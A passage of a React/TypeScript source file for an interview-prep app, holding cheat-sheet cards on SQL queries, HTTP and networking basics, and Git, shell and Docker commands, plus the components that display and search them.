FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: all rows from left + matching right (NULLs if no match)
-- "Find users with NO orders"
SELECT u.name
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;                    -- ← the NULL trick

-- RIGHT JOIN: rarely used — just flip to LEFT JOIN

-- FULL OUTER JOIN: all rows from both, NULLs for non-matches
SELECT u.name, o.amount
FROM users u
FULL OUTER JOIN orders o ON u.id = o.user_id;

-- CROSS JOIN: cartesian product — every combination
SELECT a.size, b.color FROM sizes a CROSS JOIN colors b;

-- SELF JOIN: join table to itself (org hierarchy, friends)
SELECT e.name AS employee, m.name AS manager
FROM employees e
JOIN employees m ON e.manager_id = m.id;`,
        tip: 'LEFT JOIN + WHERE right.id IS NULL = anti-join (find rows with no match). Very common!',
      },
      {
        id: 'window-functions',
        title: 'Window Functions',
        tags: ['SQL', 'Analytics', 'OVER'],
        content: 'Window functions run a calculation across a set of rows related to the current row — without collapsing rows like GROUP BY does.',
        code: `-- Syntax: function() OVER (PARTITION BY ... ORDER BY ... ROWS/RANGE ...)

-- ROW_NUMBER: rank within partition, no ties
SELECT name, dept, salary,
  ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary DESC) AS rn
FROM employees;

-- RANK / DENSE_RANK:
-- RANK: gaps after ties (1,2,2,4)
-- DENSE_RANK: no gaps (1,2,2,3)
SELECT name, salary,
  RANK()       OVER (ORDER BY salary DESC) AS rank_gap,
  DENSE_RANK() OVER (ORDER BY salary DESC) AS rank_dense
FROM employees;

-- Running total (cumulative sum)
SELECT date, amount,
  SUM(amount) OVER (ORDER BY date ROWS UNBOUNDED PRECEDING) AS running_total
FROM sales;

-- Moving average (last 7 days)
SELECT date, revenue,
  AVG(revenue) OVER (ORDER BY date ROWS 6 PRECEDING) AS moving_avg_7d
FROM daily_revenue;

-- LAG / LEAD: access previous/next row
SELECT date, revenue,
  LAG(revenue, 1) OVER (ORDER BY date) AS prev_day,
  revenue - LAG(revenue, 1) OVER (ORDER BY date) AS day_over_day
FROM daily_revenue;

-- Interview classic: top N per group
SELECT * FROM (
  SELECT *, ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary DESC) AS rn
  FROM employees
) t WHERE rn <= 3;   -- top 3 salaries per department`,
        tip: 'Window functions are asked in ~80% of data/backend senior SQL rounds. Master PARTITION BY + ORDER BY.',
      },
      {
        id: 'ctes',
        title: 'CTEs & Subqueries',
        tags: ['SQL', 'CTE', 'Readability'],
        content: 'CTEs (WITH clause) make complex queries readable. Recursive CTEs handle hierarchical data.',
        code: `-- Basic CTE — cleaner than nested subqueries
WITH active_users AS (
  SELECT id, name FROM users WHERE last_login > NOW() - INTERVAL '30 days'
),
user_orders AS (
  SELECT user_id, COUNT(*) AS order_count, SUM(amount) AS total
  FROM orders GROUP BY user_id
)
SELECT u.name, o.order_count, o.total
FROM active_users u
JOIN user_orders o ON u.id = o.user_id
ORDER BY o.total DESC;

-- Recursive CTE — org hierarchy / tree traversal
WITH RECURSIVE org_tree AS (
  -- Base case: top-level managers (no manager)
  SELECT id, name, manager_id, 0 AS depth
  FROM employees WHERE manager_id IS NULL

  UNION ALL

  -- Recursive: join children to their parent
  SELECT e.id, e.name, e.manager_id, t.depth + 1
  FROM employees e
  JOIN org_tree t ON e.manager_id = t.id
)
SELECT * FROM org_tree ORDER BY depth, name;

-- Subquery vs CTE guideline:
-- Subquery: one-off, simple, used once
-- CTE: reused 2+ times, or complex logic that needs a name`,
        tip: 'Recursive CTEs handle tree/graph traversal in SQL — graphs, org charts, categories with parents.',
      },
      {
        id: 'aggregation',
        title: 'Aggregation & Grouping',
        tags: ['SQL', 'GROUP BY', 'HAVING'],
        content: 'Master the GROUP BY execution order. WHERE filters before grouping; HAVING filters after. Both are needed.',
        code: `-- Execution order (logical, not physical):
-- FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY → LIMIT

-- WHERE vs HAVING:
SELECT dept, AVG(salary) AS avg_sal
FROM employees
WHERE status = 'active'          -- WHERE: filter ROWS before grouping
GROUP BY dept
HAVING AVG(salary) > 75000;     -- HAVING: filter GROUPS after aggregation

-- ROLLUP: subtotals + grand total
SELECT dept, job_title, SUM(salary)
FROM employees
GROUP BY ROLLUP(dept, job_title);

-- CUBE: all combinations of dimensions
GROUP BY CUBE(region, product, quarter)

-- GROUPING SETS: explicit combinations
GROUP BY GROUPING SETS ((dept), (dept, year), ())

-- Conditional aggregation (pivot without PIVOT keyword)
SELECT
  COUNT(*) AS total,
  COUNT(*) FILTER (WHERE status = 'active')   AS active,   -- PostgreSQL
  SUM(CASE WHEN status = 'active' THEN 1 END) AS active_compat  -- Standard SQL
FROM users;

-- Distinct count (avoid double counting in joins)
SELECT dept, COUNT(DISTINCT employee_id) AS headcount
FROM employee_projects
GROUP BY dept;`,
        tip: 'Conditional aggregation (SUM CASE WHEN) is the "pivot table in SQL" pattern — very common.',
      },
      {
        id: 'indexes',
        title: 'Indexes & Query Optimization',
        tags: ['SQL', 'Performance', 'B-Tree'],
        content: 'Indexes make reads fast by building a sorted auxiliary data structure. Understanding when indexes help (and hurt) is a senior skill.',
        code: `-- B-Tree index (default): great for =, <, >, BETWEEN, ORDER BY
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);  -- composite

-- Composite index rule: leftmost prefix must be used
-- idx(a, b, c) helps: WHERE a=1, WHERE a=1 AND b=2, WHERE a=1 AND b=2 AND c=3
-- idx(a, b, c) does NOT help: WHERE b=2 (skips a)

-- Covering index: all needed columns are in the index (no heap read)
CREATE INDEX idx_orders_covering ON orders(user_id, created_at, amount);
-- Query: SELECT amount FROM orders WHERE user_id=1 ORDER BY created_at
-- → index-only scan, fastest possible

-- Hash index: only equality (=), not ranges
-- GIN index: full-text search, array containment (PostgreSQL)
-- Partial index: index a subset of rows
CREATE INDEX idx_active_users ON users(email) WHERE deleted_at IS NULL;

-- When indexes HURT:
-- Heavy writes: every INSERT/UPDATE/DELETE must update all indexes
-- Low cardinality: index on boolean col (only 2 values) is pointless
-- Small tables: sequential scan is faster than index+heap lookup

-- EXPLAIN / EXPLAIN ANALYZE
EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 42;
-- Look for: Seq Scan (bad on large tables), Index Scan (good), Nested Loop vs Hash Join`,
        tip: 'Rule of thumb: index columns that appear in WHERE, JOIN ON, and ORDER BY. Not SELECT.',
      },
      {
        id: 'interview-classics',
        title: 'Classic SQL Interview Problems',
        tags: ['Interview', 'Problems'],
        content: 'The 6 most common SQL interview problem types — know these cold.',
        code: `-- 1. Nth highest salary
SELECT DISTINCT salary FROM employees
ORDER BY salary DESC LIMIT 1 OFFSET (N-1);   -- or use DENSE_RANK

-- 2. Duplicate rows
SELECT email, COUNT(*) FROM users GROUP BY email HAVING COUNT(*) > 1;

-- 3. Employees earning more than their manager
SELECT e.name FROM employees e
JOIN employees m ON e.manager_id = m.id
WHERE e.salary > m.salary;

-- 4. Consecutive logins (gaps-and-islands)
SELECT user_id, MIN(date) AS start, MAX(date) AS end, COUNT(*) AS days
FROM (
  SELECT user_id, date,
    DATE_PART('day', date - ROW_NUMBER() OVER (PARTITION BY user_id ORDER BY date) * INTERVAL '1 day') AS grp
  FROM logins
) t GROUP BY user_id, grp HAVING COUNT(*) >= 3;

-- 5. Most recent record per user (dedup)
SELECT DISTINCT ON (user_id) *    -- PostgreSQL
FROM events ORDER BY user_id, created_at DESC;
-- Or: SELECT * FROM events WHERE (user_id, created_at) IN (
--   SELECT user_id, MAX(created_at) FROM events GROUP BY user_id)

-- 6. Retention: users who returned in week 2
SELECT COUNT(DISTINCT w1.user_id) AS retained
FROM (SELECT DISTINCT user_id FROM events WHERE date BETWEEN d AND d+6) w1
JOIN (SELECT DISTINCT user_id FROM events WHERE date BETWEEN d+7 AND d+13) w2
  ON w1.user_id = w2.user_id;`,
        tip: 'Problem 4 (consecutive dates) and Problem 6 (retention) appear in 90% of data/analytics SQL rounds.',
      },
    ],
  },

  // ── Networks & HTTP ────────────────────────────────────────────────────────
  {
    id: 'networks',
    title: 'Networks & HTTP',
    icon: 'wifi',
    color: 'text-cyan-400',
    bg: 'bg-cyan-500/10',
    desc: 'HTTP status codes, headers, TCP/IP, DNS, TLS — networking essentials for backend interviews',
    cards: [
      {
        id: 'http-status',
        title: 'HTTP Status Codes',
        tags: ['HTTP', 'API', 'REST'],
        content: 'Know these by heart. Returning 200 for an error or 500 when you should return 400 will get flagged in code review.',
        code: `// 2xx Success
200 OK           — successful GET, PUT, PATCH
201 Created      — successful POST (include Location header)
204 No Content   — successful DELETE

// 3xx Redirection
301 Moved Permanently   — URL changed forever (cached by browsers)
302 Found               — temporary redirect (not cached)
304 Not Modified        — client cache still valid (ETag / Last-Modified)

// 4xx Client Errors
400 Bad Request     — malformed syntax, invalid params
401 Unauthorized    — not authenticated (missing/invalid token)
403 Forbidden       — authenticated but lacks permission
404 Not Found
409 Conflict        — e.g. duplicate unique field
422 Unprocessable   — semantically invalid payload
429 Too Many Requests — rate limited

// 5xx Server Errors
500 Internal Server Error — unexpected exception
502 Bad Gateway          — upstream service returned invalid response
503 Service Unavailable  — server down / overwhelmed (use for circuit breaking)
504 Gateway Timeout      — upstream too slow`,
        tip: '401 = "who are you?", 403 = "I know who you are, but no." Never return 200 with { success: false } in the body.',
      },
      {
        id: 'http-headers',
        title: 'Key HTTP Headers',
        tags: ['HTTP', 'Headers', 'Caching', 'CORS'],
        content: 'Headers control caching, security, content negotiation, and CORS. Understanding them prevents 90% of frontend/backend integration bugs.',
        code: `// Request headers
Authorization: Bearer <jwt>
Content-Type: application/json
Accept: application/json, text/html;q=0.9
Cache-Control: no-cache           // force revalidation
If-None-Match: "abc123"           // ETag-based conditional GET
X-Request-ID: uuid                // distributed tracing

// Response headers
Content-Type: application/json; charset=utf-8
Cache-Control: public, max-age=3600, immutable   // CDN caching
ETag: "abc123"                                    // version fingerprint
Location: /api/users/42                           // 201 Created

// Security headers (set on every response)
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Permissions-Policy: geolocation=()

// CORS (set by server when request is cross-origin)
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400   // preflight cache duration`,
        tip: 'CORS is enforced by the browser, not the server. Server just sends headers to tell the browser what to allow.',
      },
      {
        id: 'rest-design',
        title: 'REST API Design Rules',
        tags: ['REST', 'API Design', 'URLs'],
        content: 'Consistent URL patterns and HTTP verb usage are table-stakes for backend engineers. These conventions are expected in interviews.',
        code: `// Resources: always plural nouns, never verbs
GET    /api/users          — list all users (paginated)
POST   /api/users          — create user
GET    /api/users/:id      — get user by id
PUT    /api/users/:id      — full replace user
PATCH  /api/users/:id      — partial update user
DELETE /api/users/:id      — delete user

// Nested resources
GET    /api/users/:id/orders       — orders for a user
POST   /api/users/:id/orders       — create order for user
GET    /api/users/:id/orders/:oid  — specific order

// Filtering, sorting, pagination — use query strings
GET /api/products?category=electronics&sort=price_asc&page=2&limit=20

// Versioning — prefix the base URL
GET /api/v1/users   (preferred over header versioning for discoverability)

// Naming anti-patterns (never do these)
POST /api/getUser      ← verb in URL
POST /api/delete-user  ← verb in URL
GET  /api/user         ← singular noun
GET  /api/Users        ← camelCase / uppercase

// Idempotency
// GET, PUT, DELETE — idempotent (same request = same result)
// POST — NOT idempotent (each call may create a new resource)
// Use Idempotency-Key header for POST to make it safe to retry`,
        tip: 'Interviewers notice if you say PATCH for partial update vs PUT for full replace — it signals attention to detail.',
      },
      {
        id: 'tcp-ip-quick',
        title: 'TCP/IP Quick Reference',
        tags: ['TCP', 'UDP', 'Networking', 'DNS'],
        content: 'The 3-way handshake, DNS resolution, and TCP vs UDP trade-offs appear constantly in backend and system design interviews.',
        code: `// TCP 3-Way Handshake
Client → Server : SYN (seq=x)
Server → Client : SYN-ACK (seq=y, ack=x+1)
Client → Server : ACK (ack=y+1)
// Connection established — takes 1 RTT before data can flow

// TCP vs UDP
//          TCP                    UDP
// Reliable  ✅ guaranteed          ❌ no guarantee
// Ordered   ✅ in-order delivery   ❌ out-of-order OK
// Speed     slower                 ✅ faster (no handshake)
// Use case  HTTP, file transfer    DNS, video streaming, gaming, QUIC

// DNS Resolution (recursive)
// Browser cache → OS cache → Local Resolver → Root → TLD → Authoritative
1. Browser: "what's the IP for api.example.com?"
2. Local resolver (ISP or 8.8.8.8): not in cache
3. Root nameserver: "try .com TLD server"
4. .com TLD: "try ns1.example.com" (authoritative NS)
5. ns1.example.com: "api.example.com → 1.2.3.4, TTL=300s"
// Total: 4 hops; cached at each layer for TTL duration

// TLS adds ~1 RTT (TLS 1.3) before HTTPS data flows
// QUIC (HTTP/3) eliminates the TCP handshake — 0-RTT resumption`,
        tip: 'DNS TTL is the lever for zero-downtime deployments: low TTL before a cutover, high TTL for stability.',
      },
      {
        id: 'websocket-sse',
        title: 'WebSocket vs SSE vs Long Polling',
        tags: ['Real-time', 'WebSocket', 'SSE'],
        content: 'Choosing the right real-time transport is a common system design sub-question.',
        code: `//            WebSocket          SSE              Long Polling
// Direction   bidirectional      server→client    server→client
// Protocol    WS (over TCP)      HTTP/1.1+        HTTP
// Overhead    low (binary frame) medium           high (new conn/req)
// Proxy/FW    ⚠️ may block        ✅ HTTP works    ✅ HTTP works
// Reconnect   manual             automatic        automatic
// Use case    chat, games        feed, notifs     simple fallback

// WebSocket (Node.js ws library)
const ws = new WebSocket('wss://api.example.com/ws');
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.send(JSON.stringify({ type: 'PING' }));

// Server-Sent Events (SSE) — server push only
const es = new EventSource('/api/stream');
es.onmessage = (e) => console.log(e.data);
// Server sends: "data: hello\\n\\n"

// SSE response headers
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

// Scaling: WebSocket requires sticky sessions or Redis pub/sub
// SSE: same issue — connections are per-server
// Both: put a consistent-hash load balancer upstream`,
        tip: 'SSE is simpler than WebSocket for server-to-client push. Prefer SSE unless you need client→server messages.',
      },
    ],
  },

  // ── Git & CLI ──────────────────────────────────────────────────────────────
  {
    id: 'git',
    title: 'Git & CLI Essentials',
    icon: 'merge',
    color: 'text-orange-400',
    bg: 'bg-orange-500/10',
    desc: 'Git workflows, conflict resolution, rebase, and essential shell commands for every engineer',
    cards: [
      {
        id: 'git-basics',
        title: 'Git Core Workflow',
        tags: ['Git', 'Version Control'],
        content: 'The foundational git commands you use every day. Understand the staging area (index) model — it\'s what makes git powerful.',
        code: `# The three trees: working directory → index (stage) → HEAD

git status                    # what changed?
git diff                      # unstaged changes
git diff --staged             # staged changes (ready to commit)
git add -p                    # interactive: stage hunks, not whole files

git commit -m "feat: add user auth"
git commit --amend            # modify last commit (before push only!)

# Branch operations
git checkout -b feature/auth  # create + switch
git switch -c feature/auth    # modern syntax
git branch -d feature/auth    # delete local branch
git push origin -d feature/auth # delete remote

# Undoing things
git restore file.ts           # discard unstaged changes in file
git restore --staged file.ts  # unstage file (keeps changes)
git revert HEAD               # safe: creates new "undo" commit
git reset --hard HEAD~1       # DANGER: destroys last commit + changes

# Stash
git stash push -m "wip: auth refactor"
git stash list
git stash pop                 # apply latest + remove
git stash apply stash@{2}     # apply specific, keep stash`,
        tip: 'Never force-push to main. Use git revert for shared branches — it\'s safe and auditable.',
      },
      {
        id: 'git-rebase',
        title: 'Rebase & Merge Strategies',
        tags: ['Git', 'Rebase', 'Merge'],
        content: 'Rebase rewrites history for a clean linear log; merge preserves history with merge commits. Know when to use each.',
        code: `# Merge vs Rebase
# Merge: preserves branch history, creates merge commit
git checkout main
git merge feature/auth       # ← creates merge commit
# Result: main → A → B → C → M(merge)
#                          ↗ feature: X → Y ↗

# Rebase: replays commits on top of target — linear history
git checkout feature/auth
git rebase main              # replay X, Y on top of main's latest C
# Result: main → A → B → C → X' → Y'  (no merge commit)

# Interactive rebase (clean up before PR)
git rebase -i HEAD~3
# Commands: pick / reword / squash / fixup / drop

# Squash multiple commits into one
git rebase -i HEAD~4
# Change all but first to "squash" or "s"

# Resolve rebase conflict
git rebase main              # conflict!
# Edit conflicted files
git add resolved-file.ts
git rebase --continue        # not git commit!
git rebase --abort           # bail out

# Fast-forward merge (when feature is ahead of main)
git merge --ff-only feature/auth   # fails if diverged
git merge --no-ff feature/auth     # force merge commit (for audit trail)`,
        tip: 'Team convention: squash all WIP commits before merging a PR. Use rebase to update, merge to integrate.',
      },
      {
        id: 'git-advanced',
        title: 'Useful Git Commands',
        tags: ['Git', 'Productivity', 'Debug'],
        content: 'Commands that separate intermediate from advanced git users. These come up in technical interviews surprisingly often.',
        code: `# Find which commit introduced a bug
git bisect start
git bisect bad HEAD           # current is broken
git bisect good v1.2.0        # this version worked
# git tests each commit, you mark good/bad:
git bisect good / git bisect bad
# Ends with: "abc123 is the first bad commit"
git bisect reset

# Cherry-pick: apply a commit from another branch
git cherry-pick abc123        # single commit
git cherry-pick abc123..def456 # range

# View file history
git log --follow -p -- src/auth/login.ts   # with diffs
git blame src/auth/login.ts                 # line-by-line authorship
git log --all --oneline --graph             # visual branch tree

# Find deleted code
git log --all --full-history -- '*/deleted-file.ts'
git show <commit>:path/to/deleted-file.ts

# Worktrees (work on two branches simultaneously)
git worktree add ../hotfix hotfix/payment-bug
# cd ../hotfix, fix bug, come back — no stashing needed

# Config shortcuts
git config --global alias.st status
git config --global alias.lg "log --oneline --graph --all"
git config --global core.autocrlf input   # LF on checkout (Mac/Linux)`,
        tip: 'git bisect automates binary search over commits — finding a regression in 1000 commits takes 10 steps.',
      },
      {
        id: 'cli-essentials',
        title: 'Shell / CLI Essentials',
        tags: ['Linux', 'Shell', 'Bash'],
        content: 'File operations, process management, and text processing commands every backend engineer must know.',
        code: `# File & Directory
ls -la                        # list with hidden files + permissions
find . -name "*.ts" -newer package.json
find . -type f -size +10M     # files > 10MB
du -sh *                      # directory sizes
chmod 755 script.sh           # rwxr-xr-x
chown user:group file

# Text processing (the big 4)
grep -rn "apiRequest" src/    # recursive search with line numbers
grep -v "node_modules"        # exclude pattern
awk '{print $1, $3}' log.txt  # print columns 1 and 3
sed 's/foo/bar/g' file.txt    # global replace

# Pipes & redirection
cat access.log | grep "404" | wc -l              # count 404s
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10  # top IPs

# Process management
ps aux | grep node            # find node processes
kill -9 PID                   # force kill
lsof -i :3000                 # what's on port 3000?
top / htop                    # live process monitor

# Networking
curl -v https://api.example.com/health
curl -X POST -H "Content-Type: application/json" -d '{"key":"val"}' https://api
netstat -tuln                 # listening ports
ping / traceroute / nslookup api.example.com

# SSH & SCP
ssh -i ~/.ssh/key.pem user@host
scp -i key.pem local.txt user@host:/remote/path
ssh-keygen -t ed25519 -C "your@email.com"`,
        tip: 'Master: grep -rn, awk, sed, and pipe chaining. They\'re more useful than most specialized tools for debugging.',
      },
      {
        id: 'docker-cli',
        title: 'Docker CLI Quick Reference',
        tags: ['Docker', 'Containers', 'CLI'],
        content: 'The Docker commands you\'ll actually use every day in development and debugging.',
        code: `# Image operations
docker build -t myapp:v1.0 .
docker build --no-cache -t myapp:latest .
docker pull node:20-alpine
docker images                 # list local images
docker rmi myapp:old          # remove image

# Container lifecycle
docker run -d -p 3000:3000 --name api myapp:v1.0
docker run --rm -it node:20 bash          # interactive + auto-remove
docker run -v $(pwd):/app -w /app node:20 npm test  # mount + run

docker ps                     # running containers
docker ps -a                  # all containers
docker stop api && docker rm api
docker logs -f api            # follow logs
docker logs --tail 100 api    # last 100 lines
docker exec -it api sh        # shell into running container

# Docker Compose
docker compose up -d          # start services (detached)
docker compose down           # stop + remove containers
docker compose logs -f api    # follow service logs
docker compose exec db psql -U postgres

# Cleanup
docker system prune -a        # remove all unused: images, containers, networks
docker volume prune           # remove unused volumes

# Inspect
docker inspect api            # full config as JSON
docker stats                  # live CPU / memory per container
docker network ls             # list networks`,
        tip: 'docker exec -it <container> sh is your debugger — get inside any running container to inspect its state.',
      },
    ],
  },
];

// ─── Component ────────────────────────────────────────────────────────────────

function CodeBlock({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(code).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <div className="relative mt-3">
      <button
        type="button"
        onClick={copy}
        className="absolute top-2 right-2 p-1.5 rounded-lg bg-zinc-700/50 hover:bg-zinc-600/50 transition-colors"
        title="Copy code"
      >
        <Icon name={copied ? 'check' : 'content_copy'} size={13} className={copied ? 'text-green-400' : 'text-zinc-400'} />
      </button>
      <pre className="bg-[#0e0e0e] border border-white/8 rounded-xl p-4 text-xs text-zinc-300 overflow-x-auto leading-relaxed font-mono whitespace-pre">
        {code}
      </pre>
    </div>
  );
}

function CheatCard({ card, sheetColor: _sheetColor }: { card: Card; sheetColor: string }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <div className={`bg-[#1a1a1a] border border-white/8 rounded-2xl overflow-hidden transition-all duration-200 ${expanded ? 'border-white/15' : ''}`}>
      <button
        type="button"
        onClick={() => setExpanded((e) => !e)}
        className="w-full text-left px-5 py-4 flex items-start gap-4 hover:bg-white/3 transition-colors"
      >
        <div className="flex-1 min-w-0">
          <div className="flex items-start gap-2 flex-wrap mb-1">
            <h3 className="font-bold text-white text-sm">{card.title}</h3>
          </div>
          {card.complexity && !expanded && (
            <div className="flex gap-3 mt-1">
              <span className="text-[10px] font-bold text-green-400 bg-green-400/10 px-2 py-0.5 rounded-full">
                Time: {card.complexity.time}
              </span>
              <span className="text-[10px] font-bold text-blue-400 bg-blue-400/10 px-2 py-0.5 rounded-full">
                Space: {card.complexity.space}
              </span>
            </div>
          )}
          {!expanded && (
            <p className="text-zinc-500 text-xs mt-1.5 line-clamp-2">{card.content}</p>
          )}
        </div>
        <div className="flex items-center gap-2 flex-shrink-0">
          <div className="flex gap-1 flex-wrap">
            {card.tags.map((t) => (
              <span key={t} className="text-[9px] font-bold text-zinc-600 bg-zinc-800 px-2 py-0.5 rounded-full uppercase tracking-widest">
                {t}
              </span>
            ))}
          </div>
          <Icon
            name={expanded ? 'keyboard_arrow_up' : 'keyboard_arrow_down'}
            size={18}
            className="text-zinc-500 ml-1"
          />
        </div>
      </button>

      {expanded && (
        <div className="px-5 pb-5 border-t border-white/5 pt-4 space-y-4">
          {card.complexity && (
            <div className="flex gap-3">
              <span className="text-[10px] font-bold text-green-400 bg-green-400/10 px-3 py-1 rounded-full">
                Time: {card.complexity.time}
              </span>
              <span className="text-[10px] font-bold text-blue-400 bg-blue-400/10 px-3 py-1 rounded-full">
                Space: {card.complexity.space}
              </span>
            </div>
          )}

          <p className="text-zinc-300 text-sm leading-relaxed">{card.content}</p>

          {card.code && <CodeBlock code={card.code} />}

          {card.tip && (
            <div className="flex items-start gap-3 bg-[#E82127]/8 border border-[#E82127]/20 rounded-xl px-4 py-3">
              <Icon name="tips_and_updates" size={15} className="text-[#E82127] flex-shrink-0 mt-0.5" />
              <p className="text-zinc-300 text-xs leading-relaxed">{card.tip}</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export function CheatSheetsPage() {
  const { fireXP } = useUser();
  const [activeSheet, setActiveSheet] = useState(SHEETS[0]!.id);
  const [search, setSearch] = useState('');
  const [xpFired, setXpFired] = useState(false);

  const sheet = SHEETS.find((s) => s.id === activeSheet) ?? SHEETS[0]!;

  const filtered = sheet.cards.filter((c) => {
    if (!search.trim()) return true;
    const q = search.toLowerCase();
    return c.title.toLowerCase().includes(q) ||
      c.content.toLowerCase().includes(q) ||
      c.tags.some((t) => t.toLowerCase().includes(q));
  });

  const handleSheetChange = (id: string) => {
    setActiveSheet(id);
    setSearch('');
    if (!xpFired) {
      fireXP(5, 'Opened cheat sheets!');
      setXpFired(true);
    }
  };

  return (
    <AppShell>
      <div className="pt-6 pb-12 max-w-5xl">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-black tracking-tighter text-white mb-2">
            Cheat <span className="text-[#E82127]">Sheets.</span>
          </h1>
          <p className="text-zinc-400 text-lg">Quick-reference cards for interviews. Copy code, understand patterns.</p>
        </div>

        {/* Sheet selector */}
        <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-3 mb-8">
          {SHEETS.map((s) => (
            <button
              key={s.id}
              type="button"
              onClick={() => handleSheetChange(s.id)}
              className={`flex flex-col items-center gap-2 p-4 rounded-2xl border text-center transition-all ${
                activeSheet === s.id
                  ? `${s.bg} border-current/30 ${s.color}`
                  : 'bg-[#1a1a1a] border-white/8 text-zinc-500 hover:border-white/15 hover:text-zinc-300'
              }`}
            >
              <Icon name={s.icon} size={22} />
              <span className="text-[10px] font-bold uppercase tracking-widest leading-tight">{s.title}</span>
            </button>
          ))}
        </div>

        {/* Active sheet header */}
        <div className="flex items-center justify-between mb-6 flex-wrap gap-4">
          <div className="flex items-center gap-3">
            <div className={`w-10 h-10 ${sheet.bg} rounded-xl flex items-center justify-center ${sheet.color} flex-shrink-0`}>
              <Icon name={sheet.icon} size={20} />
            </div>
            <div>
              <h2 className="text-lg font-black text-white">{sheet.title}</h2>
              <p className="text-zinc-500 text-xs">{sheet.desc}</p>
            </div>
          </div>

          {/* Search */}
          <div className="flex items-center gap-2 bg-[#1a1a1a] border border-white/8 rounded-xl px-3 py-2 w-full sm:w-auto max-w-xs">
            <Icon name="search" size={16} className="text-zinc-500 flex-shrink-0" />
            <input
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search cards…"
              className="bg-transparent text-white text-sm placeholder:text-zinc-600 focus:outline-none flex-1 min-w-0"
            />
            {search && (
              <button onClick={() => setSearch('')} className="text-zinc-600 hover:text-zinc-400">
                <Icon name="close" size={14} />
              </button>
            )}
          </div>
        </div>

        {/* Cards */}
        <div className="space-y-3">
          {filtered.length === 0 ? (
            <p className="text-zinc-600 text-sm text-center py-12">No cards match "{search}"</p>
          ) : (
            filtered.map((card) => (
              <CheatCard key={card.id} card={card} sheetColor={sheet.color} />
            ))
          )}
        </div>

        {/* Footer tip */}
        <div className="mt-10 flex items-center gap-3 bg-[#1a1a1a] border border-white/8 rounded-2xl p-5">
          <Icon name="lightbulb" size={20} className="text-yellow-400 flex-shrink-0" />
          <p className="text-zinc-400 text-sm">
            <span className="text-white font-bold">Pro tip:</span> Use{' '}
            <kbd className="bg-zinc-800 text-zinc-400 text-xs px-1.5 py-0.5 rounded font-mono">Cmd+K</kbd>{' '}
            to search for any topic across EYF, or click any card to expand the full code example.
          </p>
        </div>
      </div>
    </AppShell>
  );
}
